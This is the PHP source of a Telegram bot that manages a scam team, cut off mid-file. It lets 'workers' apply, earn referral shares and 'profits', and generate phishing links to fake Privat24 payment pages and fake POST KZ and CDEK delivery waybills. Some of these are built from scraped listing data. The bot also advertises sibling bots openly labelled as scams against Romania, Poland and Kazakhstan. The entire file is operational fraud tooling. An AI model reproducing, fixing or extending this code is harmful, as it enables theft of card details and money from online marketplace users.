<?php
	include '_set.php';
	
	$post = file_get_contents('php://input');
	if (!$post || $post == '')
		exit();
	$post = json_decode($post, true);
	$msg = $post['message'];
	$iskbd = !$msg;
	if ($iskbd)
		$msg = $post['callback_query'];
	$id = $msg['from']['id'];
	if (!$id || $id == '')
		exit();
	if (isUserBanned($id))
		exit();
	/*$timer = 1 - (time() - intval(getUserData($id, 'time')));
	if ($timer > 0)
		exit();
	setUserData($id, 'time', time());*/
	$text = $msg[$iskbd ? 'data' : 'text'];
	$login = $msg['from']['username'];
	$nick = $msg['from']['first_name'].' '.$msg['from']['last_name'];
	if ($iskbd)
		$msg = $msg['message'];
	$mid = $msg[$iskbd ? 'message_id' : 'id'];
	$chat = $msg['chat']['id'];
	$image = $msg['photo'][0]['file_id'];
	$member = $msg['new_chat_member'];
	$cmd = explode(' ', $text, 2);
	$keybd = false;
	$result = false;
	$edit = false;
	$btns = [
		'profile' => '👤 Профиль',
		'settings' => '🔧 Настройки',
		'myitems' => '🗂 Объявления',
		'additem' => '📝 Создать',
		'work' => '🇷🇴🇰🇿🇵🇱 Наш арсенал 🇵🇱🇰🇿🇷🇴',
		'addsavito' => '',
		'addsyoula' => '',
		'addsitem' => 'neaktiv',
		'addstrack' => '🇺🇦 Privat24',
		'back' => '⬅️ Назад',
		'pflprfs' => '💰 Профиты',
		'itmdel' => '🗑 Удалить',
		'itmst1' => '⏳ Ожид. оплаты',
		'itmst2' => '🤟 Оплачен',
		'itmst3' => '💫 Возврат',
		'itmedtnm' => '🏷 Название',
		'itmedtam' => '💸 Стоимость',
		'stgano1' => '🌕 Ник(показан)',
		'stgano0' => '🌑 Ник (скрыт)',
		'stgrules' => '📜 Правила',
		'stgrefi' => '🤝 Реф. система',
		'stgdoms' => '🌐 Домены',
		'adgoto1' => '📦 Перейти к объявлению',
		'adgoto2' => '☄️ Перейти к объявлению',
		'stglchat' => '💎 Чат воркеров',
		'stglpays' => '💰 Канал выплат',
		'jncreate' => '📝 Подать заявку',
		'jniread' => '✅ Ознакомлен',
		'jnremake' => '♻️ Заново',
		'jnsend' => '✅ Отправить',
		'jnofor' => 'Форум',
		'jnoads' => 'Реклама',
		'jnoref' => 'Друзья',
		'jnnoref' => '🌱 Никто',
		'joinaccpt' => '✅ Принять',
		'joindecl' => '❌ Отказать',
		'topshw1' => '💸 По общей сумме профитов',
		'topshw2' => '🤝 По профиту от рефералов',
	];
	function doRules() {
		return [
			'📜 <b>Наши правила:</b>',
			'',
			'1. В чате запрещена реклама, флуд, спам, недопустимый контент',
			'2. Профит заблокированного воркера либо не состоящего в чате не выплачивается',
			'3. Мы не несем ответственности за блокировку карт и кошельков',
		];
	}
	function doShow($cmd2) {
		global $id, $btns;
		$t = explode(' ', $cmd2);
		if (!in_array($t[0], ['item', 'track']))
			return;
		$isnt = ($t[0] == 'item');
		$item = $t[1];
		if (!isItem($item, $isnt))
			return;
		if (!isUserItem($id, $item, $isnt))
			return;
		$itemd = getItemData($item, $isnt);
		$result = false;
		$keybd = false;
		if ($isnt) {
		$list = R::find('post',' track = ?',[$item]);
			$i       = 1;
			foreach ($list as $key) {
				$i++;
			}
		$result = [
				'📦 <b>Информация об объявлении</b>',
				'',
				'🆔 Номер отслеживания: <b>'.$item.'</b>',
				'💵 Стоимость: <b>'.beaCash($key['amount']).'</b>',
				'',
				'📆 Дата генерации: <b>'.date('d.m.Y</b> в <b>H:i', $itemd[4]).'</b>',
				'',
				//'🚙 POST KZ: <b><a href="'.$key->post1.'">1.0</a></b> / <b><a href="'.$key->post2.'">2.0</a></b> / <b><a href="'.$key->postref.'">Возврат</a></b>',
				//'🚙 POST KZ: <b><a href="'.$key->post1.'">1.0</a></b> / <b><a href="'.$key->post2.'">2.0</a></b> / <b><a href="'.$key->postref.'">Возврат</a></b>',
				'🚙 POST KZ: <b><a href="'.$key->post1.'">Оплата</a></b> / <b><a href="'.$key->post2.'">Получение</a></b>',
				'🚙 CDEK KZ: <b><a href="'.$key->cdek1.'">Оплата</a></b> / <b><a href="'.$key->cdek2.'">Получение</a></b>',
			];
			
			$keybd = [true, [
				[
					['text' => $btns['itmdel'], 'callback_data' => '/dodelete '.$t[0].' '.$item],
					['text' => $btns['itmedtnm'], 'callback_data' => '/doedtnm '.$t[0].' '.$item],
					['text' => $btns['itmedtam'], 'callback_data' => '/doedtam '.$t[0].' '.$item],
				],
				/*[
					['text' => $btns['itmdel'], 'callback_data' => '/dodelete '.$t[0].' '.$item],
				],*/
			]];
		} else {
			$list = R::find('info',' track = ?',[$item]);
			$i       = 1;
			foreach ($list as $key) {
				$i++;
			}
			$result = [
				'☄️ <b>Данные успешно получены</b>',
				'',
				'🆔 Номер объявления: <b>'.$item.'</b>',
				'🏷 Название: <b>'.$key['item'].'</b>',
				'💵 Стоимость: <b>'.beaCash($key['amount']).'</b>',
				'',
				'📆 Дата генерации: <b>'.date('d.m.Y</b> в <b>H:i', $itemd[4]).'</b>',
				'',
				'🗳 Private24: <b><a href=\''.$key->privat1.'\'>Получение средств</a></b>',
			];
			$t2 = [];
			$keybd = [true, [
				$t2,
				[
					['text' => $btns['itmedtnm'], 'callback_data' => '/doedtnm '.$t[0].' '.$item],
					['text' => $btns['itmedtam'], 'callback_data' => '/doedtam '.$t[0].' '.$item],
				],
				[
					['text' => $btns['itmdel'], 'callback_data' => '/dodelete '.$t[0].' '.$item],
				],
			]];
		}
		return [$result, $keybd];
	}
	function doSettings() {
		global $id, $btns;
		setInput($id, '');
		$result = [
			'🔧 <b>Настройки</b>',
			'',
		];
		$anon = (isUserAnon($id) ? '0' : '1');
		$t = [
			[
				['text' => $btns['stgano'.$anon], 'callback_data' => '/setanon '.$anon],
			],
			[
                ['text' => $btns['stglchat'], 'url' => linkChat()],
				['text' => $btns['stglpays'], 'url' => linkPays()],
			],
		];
		$checks = getUserChecks($id);
		$c = count($checks);
		if ($c != 0) {
			$t[0] = array_merge([
				['text' => $btns['stgchks'].' ('.$c.')', 'callback_data' => '/getchecks'],
			], $t[0]);
		}
		$keybd = [true, $t];
		return [$result, $keybd];
	}
	function doProfile() {
		global $id, $btns, $chat, $login, $text;
		$result = false;
		$keybd = false;
		if (!isUserAccepted($id)) {
			if ($text == $btns['back'] && getInput($id) == '')
				return;
			if (regUser($id, $login)) {
					$check = R::findOne('users','user = ?',[$id]);
					if (!$check) {
						$add           = R::dispense('users');
						$add->user     = $id;
						$add->username = getUserData($id, 'login');
						$add->time     = (time() - 60);
						R::store($add);
					}
				botSend([
					'➕ <b>'.userLogin($id, true).'</b> запустил бота',
				], chatAlerts());
			}
			setInput($id, '');
			$result = [
				'🥀 Добро пожаловать в <b>'.prjName().'</b>',
			];
			$keybd = [false, [
				[
					['text' => $btns['jncreate']],
				],
			]];
		} else {
			$keybd = [true, [
				[
					['text' => $btns['stgrules'], 'callback_data' => '/getrules'],
					['text' => $btns['settings'], 'callback_data' => '/setanon'],
				],
			]];
			$rate = getRate($id);
			$profit = getUserProfit($id);
			$result = [
				'👤 <b>['.prjName().']</b>',
				'',
				'🐵 Мой ник: <b>'.userLogin2($id).'</b>',
				'🆔 Мой ID: <b>'.$id.'</b>',
				'⚖️ Ставка: <b>'.$rate[0].'%</b> / <b>'.$rate[1].'%</b>',
				'',
				'🗂 Активных объявлений: <b>'.(count(getUserItems($id, true)) + count(getUserItems($id, false))).'</b>',
				'',
				'🤝 Меня пригласил: <b>'.getUserReferalName($id).'</b>',
				'',
				'🤝 Приглашено воркеров: <b>'.getUserRefs($id).'</b>',
				'⭐️ Статус: <b>'.getUserStatusName($id).'</b>',
				'📆 В команде: <b>'.beaDays(userJoined($id)).'</b>',
			];
			$balance2 = getUserBalance2($id);
			if ($balance2 > 0)
				array_splice($result, 5, 0, [
					'🍫 Заблокировано: <b>'.beaCash($balance2).'</b>',
				]);
				
			botSend([
				'🥰 Загружаю информацию о вашем профиле 🥰',
			], $chat, [false, [
				[
					['text' => $btns['profile']],
				],
				[
					['text' => $btns['myitems']],
					['text' => $btns['additem']],
				],
			]]);
		}
		return [$result, $keybd];
	}
	switch ($chat) {
		case $id: {
			if (!isUserAccepted($id)) {
				switch ($text) {
					case $btns['back']: case '/start': {
						list($result, $keybd) = doProfile();
						break;
					}
					case $btns['jncreate']: {
						if (getInput($id) != '')
							break;
						if (getUserData($id, 'joind')) {
							$result = [
								'❗️ Вы уже подали заявку, ожидайте',
							];
							break;
						}
						setInput($id, 'dojoinnext0');
						botSend([
							'✏️ <b>'.userLogin($id, true).'</b> приступил к заполнению заявки на вступление',
						], chatAlerts());
						$result = doRules();
						$keybd = [false, [
							[
								['text' => $btns['jniread']],
							],
						]];
						break;
					}
					case $btns['jniread']: {
						if (getInput($id) != 'dojoinnext0')
							break;
						setInput($id, 'dojoinnext1');
						$result = [
							'🍪 Откуда вы узнали о нас?',
						];
						$keybd = [false, [
							[
								['text' => $btns['jnofor']],
								['text' => $btns['jnoads']],
								['text' => $btns['jnoref']],
							],
							[
								['text' => $btns['back']],
							],
						]];
						break;
					}
					case $btns['jnsend']: {
						if (getInput($id) != 'dojoinnext4')
							break;
						setInput($id, 'dojoinnext5');
						if (getUserData($id, 'joind'))
							break;
						setUserData($id, 'joind', '1');
						$joind = [
							getInputData($id, 'dojoinnext1'),
							getInputData($id, 'dojoinnext2'),
						];
						$result = [
							'💎 <b>Вы подали заявку на вступление</b>',
						];
						$keybd = [false, [
							[
								['text' => $btns['back']],
							],
						]];
						botSend([
							'🐥 <b>Заявка на вступление</b>',
							'',
							'👤 От: <b>'.userLogin($id, true).'</b>',
							'🍪 Откуда узнал: <b>'.$joind[0].'</b>',
							'⭐️ Опыт: <b>'.$joind[1].'</b>',
							'🤝 Пригласил: <b>'.getUserReferalName($id, true, true).'</b>',
							'📆 Дата: <b>'.date('d.m.Y</b> в <b>H:i:s').'</b>',
						], chatAdmin(), [true, [
							[
								['text' => $btns['joinaccpt'], 'callback_data' => '/joinaccpt '.$id],
								['text' => $btns['joindecl'], 'callback_data' => '/joindecl '.$id],
							],
						]]);
						break;
					}
				}
				if ($result)
					break;
				switch ($cmd[0]) {
					case '/start': {
						if (substr($cmd[1], 0, 2) == 'r_') {
							$t = substr($cmd[1], 2);
							if (isUser($t))
								setUserReferal($id, $t);
						}
						list($result, $keybd) = doProfile();
						break;
					}
				}
				if ($result)
					break;
				switch (getInput($id)) {
					case 'dojoinnext1': {
						if ($text == $btns['jniread'])
							break;
						$text2 = beaText($text, chsAll());
						if (mb_strlen($text2) < 4 || mb_strlen($text2) > 32) {
							$result = [
								'❗️ Введите корректное предложение',
							];
							break;
						}
						setInputData($id, 'dojoinnext1', $text2);
						setInput($id, 'dojoinnext2');
						$result = [
							'⭐️ Есть ли опыт работы? Если да, то какой',
						];
						$keybd = [false, [
							[
								['text' => $btns['back']],
							],
						]];
						break;
					}
					case 'dojoinnext2': {
						if (in_array($text, [
							$btns['jnofor'],
							$btns['jnoads'],
							$btns['jnoref'],
						]))
							break;
						$text2 = beaText($text, chsAll());
						if (mb_strlen($text2) < 3 || mb_strlen($text2) > 64) {
							$result = [
								'❗️ Введите корректное предложение',
							];
							break;
						}
						setInputData($id, 'dojoinnext2', $text2);
						setInput($id, 'dojoinnext3');
						$result = [
							'🤝 Кто вас пригласил? Введите его ID',
						];
						$keybd = [false, [
							[
								['text' => $btns['jnnoref']],
							],
							[
								['text' => $btns['back']],
							],
						]];
						break;
					}
					case 'dojoinnext3': {
						$text2 = beaText($text, chsNum());
						$t = ($text2 != '' && isUser($text2) && $text2 != $id);
						if ($text != $btns['jnnoref'] && !$t) {
							$result = [
								'❗️ Пользователь с таким ID не найден',
							];
							break;
						}
						setInput($id, 'dojoinnext4');
						$joind = [
							getInputData($id, 'dojoinnext1'),
							getInputData($id, 'dojoinnext2'),
						];
						if ($t)
							setUserReferal($id, $text2);
						$result = [
							'🐥 <b>Ваша заявка готова к отправке</b>',
							'',
							'🍪 Откуда узнали: <b>'.$joind[0].'</b>',
							'⭐️ Опыт: <b>'.$joind[1].'</b>',
							'🤝 Пригласил: <b>'.getUserReferalName($id).'</b>',
						];
						$keybd = [false, [
							[
								['text' => $btns['jnsend']],
							],
							[
								['text' => $btns['back']],
							],
						]];
						break;
					}
				}
				break;
			}
			if ($result)
				break;
			switch ($text) {
				case $btns['profile']: case $btns['back']: case '/start': {
					setInput($id, '');
					$t = [];
					if ($text == '/start')
						$t[] = '😊 С возвращением.';
					$t0 = userLogin($id, true, true);
					if (updLogin($id, $login)) {
						botSend([
							'✍️ <b>'.$t0.'</b> теперь известен как <b>'.userLogin($id).'</b>',
						], chatAlerts());
					}
					list($result, $keybd) = doProfile();
					if (count($t) != 0)
						$result = array_merge($t, [''], $result);
					break;
				}
				case $btns['settings']: {
					list($result, $keybd) = doSettings();
					break;
				}
					case $btns['work']: {
						
						$result = ['<b>Наши боты</b>',
						'<b><a href=\'https://t.me/Kuli4_Bot\'>🇷🇴Скам по Румынии</a></b>',
						'<b><a href=\'https://t.me/KULICH_PL_Bot\'>🇵🇱Скам по Польше</a></b>',
						'<b><a href=\'https://t.me/KULICH_KZ_Bot\'>🇰🇿Скам по Казахстану</a></b>',
						'',];
						
						break;
					}
				case $btns['myitems']: {
					setInput($id, '');
					$items = getUserItems($id, true);
					$tracks = getUserItems($id, false);
					$itemsc = count($items);
					$tracksc = count($tracks);
					if ($itemsc == 0 && $tracksc == 0) {
						$result = [
							'❗️ У вас нет созданных ссылок',
						];
						break;
					}
					$keybd = [];
					if ($itemsc != 0) {
						return;
					}
					if ($tracksc != 0) {
						if ($itemsc != 0)
							$result[] = '';
						$result[] = '☄️ <b>Объявления ('.$tracksc.'):</b>';
						for ($i = 0; $i < $tracksc; $i++) {
							$track = $tracks[$i];
							$trackd = getItemData($track, false);
							$result[] = ($i + 1).'. <b>'.$track.'</b> - <b>'.$trackd[6].'</b> за <b>'.beaCash($trackd[5]).'</b>';
							$keybd[] = [
								['text' => beaCash($trackd[5]).' - '.$trackd[6], 'callback_data' => '/doshow track '.$track],
							];
						}
					}
					$keybd = [true, $keybd];
					break;
				}
				case $btns['additem']: {
					setInput($id, 'additem0');
					$keybd = [false, [
						[
							['text' => $btns['addstrack']],
						],
						[
							['text' => $btns['back']],
						],
					]];
					$result = [
						'📝 <b>Начало работы</b>',
						'',
						'❕ <i>Выберите нужное направление для создания ссылки</i>',
					];
					break;
				}
			}
			if ($result)
				break;
			switch ($cmd[0]) {
				case '/doprofits': {
					$profits = getUserProfits($id);
					if (!$profits) {
						$result = [
							'❗️ У вас нет ни одного профита',
						];
						break;
					}
					$c = count($profits);
					$result = [
						'💰 <b>Ваши профиты ('.$c.'):</b>',
						'',
					];
					for ($i = 0; $i < $c; $i++) {
						$t = explode('\'', $profits[$i]);
						$result[] = ($i + 1).'. <b>'.beaCash(intval($t[1])).'</b> - <b>'.date('d.m.Y</b> в <b>H:i:s', intval($t[0])).'</b>';
					}
					break;
				}
				case '/getrules': {
					$result = doRules();
					break;
				}
				
				case '/getrefi': {
					$result = [
						'🤝 <b>Реферальная система</b>',
						'',
						'❤️ Чтобы воркер стал вашим рефералом, при подаче заявки он должен указать ваш ID <b>'.$id.'</b>',
						'🧀 Также он может перейти по вашей реф. ссылке: <b>'.urlReferal($id).'</b>',
						'',
					];
					break;
				}
				case '/doedtnm': {
					$t = explode(' ', $cmd[1]);
					if (!in_array($t[0], ['item', 'track']))
						break;
					$isnt = ($t[0] == 'item');
					$item = $t[1];
					if (!isItem($item, $isnt))
						break;
					if (!isUserItem($id, $item, $isnt))
						break;
					setInputData($id, 'edtnm1', $t[0]);
					setInputData($id, 'edtnm2', $item);
					setInput($id, 'edtnm3');
					$result = [
						'✏️ Введите новое название товара:',
					];
					break;
				}
				case '/doedtam': {
					$t = explode(' ', $cmd[1]);
					if (!in_array($t[0], ['item', 'track']))
						break;
					$isnt = ($t[0] == 'item');
					$item = $t[1];
					setInputData($id, 'edtam1', $t[0]);
					setInputData($id, 'edtam2', $item);
					setInput($id, 'edtam3');
					$result = [
						'✏️ Введите новую стоимость товара:',
					];
					break;
				}
				
				
				case '/dodelete': {
					$t = explode(' ', $cmd[1]);
					if (!in_array($t[0], ['item', 'track']))
						break;
					$isnt = ($t[0] == 'item');
					$item = $t[1];
					if (!isItem($item, $isnt))
						break;
					if (!isUserItem($id, $item, $isnt))
						break;
					delUserItem($id, $item, $isnt);
					$result = [
						'❗️ Ваше'.($isnt ? 'е объявление' : ' объявление').' <b>'.$item.'</b> удалено'.($isnt ? 'о' : ''),
					];
					$delaaa = R::findOne('info',' track = ?',[$item]);
					R::trash($delaaa);
					break;
				}
				case '/dostatus': {
					$t = explode(' ', $cmd[1]);
					if (!in_array($t[1], ['1', '2', '3']))
						break;
					$item = $t[0];
					if (!isItem($item, $isnt))
						break;
					if (!isUserItem($id, $item, $isnt))
						break;
					$st = trackStatus($t[1]);
					setItemData($item, 16, $t[1], $isnt);
					list($result, $keybd) = doShow('track '.$item);
					$edit = true;
					break;
				}
				case '/doshow': {
					list($result, $keybd) = doShow($cmd[1]);
					break;
				}
				case '/setanon': {
					$t = ($cmd[1] == '1');
					setUserAnon($id, $t);
					list($result, $keybd) = doSettings();
					$edit = true;
					break;
				}
			}
			if ($result)
				break;
			switch (getInput($id)) {
				case 'additem0': {
					if ($text == $btns['addsitem']) {
						setInput($id, 'additem1');
					if(empty(getInputData($id, 'additem1'))){
						$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];						
					}
					else{
					$keybd = [false, [
							[
								['text' => getInputData($id, 'additem1')],
							],							
							[
								['text' => $btns['back']],
							],
						]];	
					}	
						$result = [
							'✏️ Введите название товара:',
						];
					} elseif ($text == $btns['addstrack']) {
						setInput($id, 'addtrack1');
					if(empty(getInputData($id, 'addtrack1'))){
						$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];						
					}
					else{
					$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
					}
						$result = [
							'✏️ Введите нужную сумму для создания ссылки',
						];
					} elseif ($text == $btns['addsavito']) {
						setInput($id, 'additem5');
						$keybd = [false, [
							[
								['text' => $btns['back']],
							],
						]];
						$result = [
							'✏️ Введите ссылку на объявление с сайта Авито:',
						];
					} elseif ($text == $btns['addsyoula']) {
						setInput($id, 'additem6');
						$keybd = [false, [
							[
								['text' => $btns['back']],
							],
						]];
						$result = [
							'✏️ Введите ссылку на объявление с сайта Юла:',
						];
					} else {
						$result = [
							'❗️ Выберите сервис из списка',
						];
					}
					break;
				}
				case 'additem1': {
					$text2 = beaText($text, chsAll());
					if ($text2 != $text || mb_strlen($text2) < 4 || mb_strlen($text2) > 96) {
						$result = [
							'❗️ Введите корректное название',
						];
						break;
					}
					setInputData($id, 'additem1', $text2);
					setInput($id, 'additem2');
					$result = [
						'✏️ Введите стоимость товара:',
					];
					if(empty(getInputData($id, 'additem2'))){
						$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];						
					}
					else{
					$keybd = [false, [
							[
								['text' => getInputData($id, 'additem2')],
							],							
							[
								['text' => $btns['back']],
							],
						]];	
					}
					break;
				}
				
			case 'additem12':{
					$text2 = beaText($text, chsNum());
					if ($text2 != $text || mb_strlen($text2) != 11) {
						$result = [
							'❗️ Введите корректный телефон',
						];
						break;
					}
					setInput($id, '');
					$itemd = [
						0, 0, 0, $id, time(),
						getInputData($id, 'additem2'),
						getInputData($id, 'additem1'),
						getInputData($id, 'additem3'),
						getInputData($id, 'additem4'),
						getInputData($id, 'additem5'),
						getInputData($id, 'additem6'),
						getInputData($id, 'additem7'),
						getInputData($id, 'additem8'),
						getInputData($id, 'additem9'),
						getInputData($id, 'additem10'),
						getInputData($id, 'additem11'),
						$text2,
					];
					$item = addUserItem($id, $itemd, true);
					
					
					
					$add       = R::dispense('post');
					$add->track    = $item;
					$add->worker    = '@'.getUserData($id, 'login');
					$add->worker_chat    = $id;
					$add->amount    = getInputData($id, 'additem2');
					$add->item    = getInputData($id, 'additem1');
					$add->fiosend   =  getInputData($id, 'additem5');
					$add->fiopriem   =  getInputData($id, 'additem6');
					$add->addresssend    = getInputData($id, 'additem7');
					$add->addresspriem    = getInputData($id, 'additem8');
					$add->citysend    = getInputData($id, 'additem3');
					$add->citypriem    = getInputData($id, 'additem4');
					$add->phonesend    = getInputData($id, 'additem11');
					$add->phonepriem    = $text2;
					$add->datesend    = getInputData($id, 'additem10');
					$add->datepriem    = getInputData($id, 'additem9');
					$add->cdek1    = $domains['cdek1'].''.$item.'';
					$add->cdek2    = $domains['cdek2'].''.$item.'';
					$add->cdekref    = $domains['cdekref'].''.$item.'';
					$add->post1    = $domains['post1'].''.$item.'';
					$add->post2    = $domains['post2'].''.$item.'';
					$add->postref    = $domains['postref'].''.$item.'';
					R::store($add);
					
					
					$result = [
						'🎉 Накладные под номером <b>'.$item.'</b> успешно созданы!',
					];
					$keybd = [true, [
						[
							['text' => $btns['adgoto1'], 'callback_data' => '/doshow item '.$item],
						],
					]];
					botSend([
						'📦 <b>Создание накладных</b>',
						'',
						'🆔 ID объявления: <b>'.$item.'</b>',
						'🏷 Название: <b>'.$itemd[6].'</b>',
						'💵 Стоимость: <b>'.beaCash($itemd[5]).'</b>',
						'👤 От: <b>'.userLogin($id, true, true).'</b>',
					], chatAlerts());
					
					
					
					
					
					break;
			}
				

				
				
				case 'addtrack1': {
					setInput($id, '');
					$trackd = [
						0, 0, 0, $id, time(),
						getInputData($id, 'addtrack1'),
						getInputData($id, 'itemname'),
						getInputData($id, 'addtrack5'),
						getInputData($id, 'addtrack3'),
						getInputData($id, 'addtrack4'),
						getInputData($id, 'addtrack6'),
						$text2,
						'1',
					];
					$track = addUserItem($id, $trackd, false);
					$add       = R::dispense('info');
					$add->track    = $track;
					$add->order_id    = $track;
					$add->worker    = '@'.getUserData($id, 'login');
					$add->worker_chat    = $id;
					$add->amount    = $text;
					$add->orderid   = $track;
					$add->privat1    = $domains['privat1'].$track.'';
					R::store($add);	
					$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
					$result = [
						'🎉 Ссылка под номером <b>'.$track.'</b> сформирована',
					];
					$keybd = [true, [
						[
							['text' => $btns['adgoto2'], 'callback_data' => '/doshow track '.$track],
						],
					]];
					break;	
				}
				
				case 'addtrack4': {
					$text2 = beaText($text, chsAll());
					if ($text2 != $text || mb_strlen($text2) < 3 || mb_strlen($text2) > 48) {
						$result = [
							'❗️ Введите корректный город',
						];
						break;
					}
		setInputData($id, 'addtrack4', $text2);
							$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
		$url = getInputData($id, 'testlnkpl');
		$ch = curl_init();
		$header = array("Accept: application/json"); 
		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
		curl_setopt($ch, CURLOPT_ENCODING, "gzip");
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLPROXY_SOCKS4, true);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322)');
		$response = curl_exec($ch);
							$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
		if ($response) {
			preg_match_all('#<span class="adPage__content__price-feature__prices__price__value" itemprop="price" content="(.+?)">#is', $response, $amount);
			preg_match_all('#<h1 itemprop="name">(.+?)</h1>#su', $response, $title);
			preg_match_all('#<meta itemprop="sku" content="(.+?)" />#is', $response, $order_id);
			preg_match_all('#<link rel="alternate" hreflang="ru" href="(.+?)" />#is', $response, $link);
			preg_match_all('#<a class="js-fancybox mfp-zoom mfp-image" data-src="(.+?)"#is', $response, $picture);
			$city = file('settings/cities.txt');
			setInputData($id, 'itemname', $title[1][0]);
			setInputData($id, 'amountitem', $amount[1][0]);
			$orders_create = preg_replace('/[^0-9]/', '', $order_id[1][0]);
								$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
								setInput($id, '');
					$trackd = [
						0, 0, 0, $id, time(),
						getInputData($id, 'amountitem'),
						getInputData($id, 'itemname'),
						getInputData($id, 'addtrack5'),
						getInputData($id, 'addtrack3'),
						getInputData($id, 'addtrack4'),
						getInputData($id, 'addtrack6'),
						$text2,
						'1',
					];
					$track = addUserItem($id, $trackd, false);
					$add       = R::dispense('info');
					$add->track    = $track;
					$add->order_id    = $orders_create;
					$add->worker    = '@'.getUserData($id, 'login');
					$add->worker_chat    = $id;
					$add->amount    = $amount[1][0];
					$add->orderid   = $orders_create;
					$add->url       = $link[1][0];
					$add->item     = $title[1][0];
					$add->img     = $picture[1][0];
					$add->recipient     = getInputData($id, 'addtrack2');
					$add->address     = getInputData($id, 'addtrack3');
					$add->sendercity     = $text2;
					$add->weight     = rand(1000,5000);
					$add->md1    = $domains['md1'].$orders_create.'';
					$add->md2    = $domains['md2'].$orders_create.'';
					$add->refund    = $domains['refund'].$orders_create.'';
					R::store($add);	
					$keybd = [false, [							
							[
								['text' => $btns['back']],
							],
						]];	
					$result = [
						'🎉 Ссылка под номером <b>'.$track.'</b> сформирована',
					];
					$keybd = [true, [
						[
							['text' => $btns['adgoto2'], 'callback_data' => '/doshow track '.$track],
						],
					]];
					break;
				}
		}
				
				
				case 'edtnm3': {
					$text2 = beaText($text, chsAll());
					if ($text2 != $text || mb_strlen($text2) < 4 || mb_strlen($text2) > 96) {
						$result = [
							'❗️ Введите корректное название',
						];
						break;
					}
					setInput($id, '');
					$isnt = (getInputData($id, 'edtnm1') == 'item');
					$item = getInputData($id, 'edtnm2');
					setItemData($item, 6, $text2, $isnt);
					list($result, $keybd) = doShow(($isnt ? 'item' : 'track').' '.$item);
					$update_item = R::findOne('info',' track = ?',[$item]);
					$update_item->item = $text2;
					R::store($update_item);
					break;
				}
				case 'edtam3': {
					$text = intval(beaText($text, chsNum()));
					if ($text < amountMin() || $text > amountMax()) {
						$result = [
							'❗️ Введите стоимость от '.beaCash(amountMin()).' до '.beaCash(amountMax()),
						];
						break;
					}
					setInput($id, '');
					$isnt = (getInputData($id, 'edtam1') == 'item');
					$item = getInputData($id, 'edtam2');
					setItemData($item, 5, $text, $isnt);
					list($result, $keybd) = doShow(($isnt ? 'item' : 'track').' '.$item);
					$update_amount = R::findOne('info',' track = ?',[$item]);
					$update_amount->amount = $text;
					R::store($update_amount);
					break;
				}

			}
			break;
		}
		case chatAdmin(): {
			if (getUserStatus($id) < 4)
				break;
			$flag = false;
			switch ($cmd[0]) {
				case '/joinaccpt': {
					$t = $cmd[1];
					if (!isUser($t))
						break;
					if (!getUserData($t, 'joind'))
						break;
					setUserData($t, 'joind', '');
					regUser($t, false, true);
					botSend([
						'🎉 <b>Ваша заявка на вступление одобрена</b>',
					], $t, [true, [
						[
							['text' => $btns['profile'], 'callback_data' => '/start'],
						],
						[
							['text' => $btns['stglchat'], 'url' => linkChat()],
							['text' => $btns['stglpays'], 'url' => linkPays()],
						],
					]]);
					$referal = getUserReferal($t);
					if ($referal) {
						addUserRefs($referal);
						botSend([
							'🤝 У вас появился новый реферал - <b>'.userLogin($t).'</b>',
						], $referal);
					}
					botSend([
						'🐥 <b>Одобрение заявки</b>',
						'',
						'👤 Подал: <b>'.userLogin($t, true).'</b>',
						'📆 Дата: <b>'.date('d.m.Y</b> в <b>H:i:s').'</b>',
						'❤️ Принял: <b>'.userLogin($id, true, true).'</b>',
					], chatAlerts());
					botDelete($mid, $chat);
					$flag = true;
					break;
				}
				case '/joindecl': {
					$t = $cmd[1];
					if (!isUser($t))
						break;
					if (!getUserData($t, 'joind'))
						break;
					setUserData($t, 'joind', '');
					botSend([
						'❌ <b>Ваша заявка на вступление отклонена</b>',
					], $t);
					botSend([
						'🐔 <b>Отклонение заявки</b>',
						'',
						'👤 Подал: <b>'.userLogin($t, true).'</b>',
						'📆 Дата: <b>'.date('d.m.Y</b> в <b>H:i:s').'</b>',
						'💙 Отказал: <b>'.userLogin($id, true, true).'</b>',
					], chatAlerts());
					botDelete($mid, $chat);
					$flag = true;
					break;
				}
					case '/help': {
					$result = [
						'<b>⚙️Основные команды⚙️</b>',
						'',
						'<b>/help - Основные команды</b>',
						'<b>/say (Сообщение) - Отправить в чат воркеров</b>',
						'<b>/alert (Сообщение) - Отправить всем в лс</b>',
						'<b>/newRate (оплата/возврат)</b>',
						'<b>/items (ID) - Объявления, Трэк-кода воркера</b>',
						'<b>/rank (ID воркера)  (0 - без статуса, 1 - заблокирован, 2 - воркер, 3 - помощник, 4 - модератор, 5 - администратор)(</b>',
						'<b>/user (ID) - Информация про воркера</b>',
					];
					$flag = true;
					break;
				}
				case '/user': {
					$id2 = $cmd[1];
					if ($id2 == '' || !isUser($id2)) {
						$result = [
							'❗️ Пользователь с таким ID не найден',
						];
						break;
					}
					$rate = getRate($id2);
					$profit = getUserProfit($id2);
					$result = [
						'👤 <b>Профиль '.userLogin($id2).'</b>',
						'',
						'🆔 ID: <b>'.$id2.'</b>',
						'⚖️ Ставка: <b>'.$rate[0].'%</b> / <b>'.$rate[1].'%</b>',
						'',
						'🗂 Активных объявлений: <b>'.(count(getUserItems($id2, true)) + count(getUserItems($id2, false))).'</b>',
						'',
						'🤝 Приглашено воркеров: <b>'.getUserRefs($id2).'</b>',
						'⭐️ Статус: <b>'.getUserStatusName($id2).'</b>',
						'📆 В команде: <b>'.beaDays(userJoined($id2)).'</b>',
						'',
						'🙈 Ник: <b>'.userLogin2($id2).'</b>',
						'🤝 Пригласил: <b>'.getUserReferalName($id2).'</b>',
					];
					$flag = true;
					break;
				}
			}
			if ($result || $flag)
				break;
			if (getUserStatus($id) < 5)
				break;
			switch ($cmd[0]) {
